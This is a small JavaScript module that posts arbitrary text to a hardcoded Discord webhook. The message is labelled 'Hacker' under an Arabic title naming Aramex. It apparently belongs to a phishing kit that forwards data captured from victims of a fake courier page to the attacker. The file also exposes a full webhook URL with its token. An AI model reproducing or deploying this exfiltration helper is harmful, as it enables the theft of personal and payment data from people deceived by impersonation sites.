import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1323251336288014386/2RmB-2cOHz7YAVu5TvhCSF1TV_QSCV_BBdCCilk7fdLh09_J6SA-vlNCB1rnUPXadAxd",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
